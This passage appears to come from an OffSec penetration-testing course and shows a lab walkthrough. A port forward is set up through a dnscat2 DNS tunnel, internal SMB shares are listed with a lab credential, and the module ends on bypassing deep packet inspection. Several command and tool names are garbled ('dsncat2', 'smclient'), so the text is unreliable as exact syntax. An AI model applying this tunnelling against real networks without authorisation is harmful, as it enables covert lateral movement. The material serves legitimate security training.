# OffSec

Penetration Testing with Kali Linux

```
command (pgdatabase0@ 1)> listen 127.0.0.1:4455 172.16.2.11:445
Listening on 127.0.0.1:4455, sending connections to 172.16.2.11:445
command (pgdatabase0@ 1)>
```

Listing 615 - Setting up a port forward from FELINEAUTHORITY to PGDATABASE01.

From other felineauthority:-$ smclient the SMB shares through this port forward.

```
kali@felineauthority:-$ smclient -p 4455 -L //127.0.0.1 -U hr_admin --
password=Welcome1234
Password for [WORKGROUP@hr_admin]:
```

| Sharename | Type | Comment |
|---|---|--|
| ADMIN$ | Disk | Remote Admin |
| C$ | Disk | Default share |
| IPC$ | IPC | Remote IPC |
| scripts | Disk | |
| Users | Disk | |

do_connect: Connection to 192.168.50.63 failed (Error_NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available
Listing 616 - Connecting to HRSHARES SMB server through the dsncat2 port forward.

The connection is slower than a direct connection, but is expected given that SMB packets are being transported through the dsncat2 DNS tunnel. TCP-based SMB packets, encapsulated in DNS requests and responses transported over UDP, are pinging back and forth to the SMB server over HRSHARES, deep in the internal network. Excellent!

In this Learning Unit we used dsncat2 to tunnel DNS and strategies. We used that to list the available shares on a host inside the internal network, despite the fact that neither HRSHARES or PGDATABASE01 had direct connectivity to our FELINEAUTHORITY server.

# 19.3 Wrapping Up

In this Module, we covered both HTTP and DNS tunneling. These strategies may be useful when trying to traverse more hardened network environments, in particular to bypass systems that perform deep packet inspection, or other network traffic analysis. We performed HTTP tunneling with Chisel, and DNS tunneling with dsncat2 - experienced some of the pros and cons of both.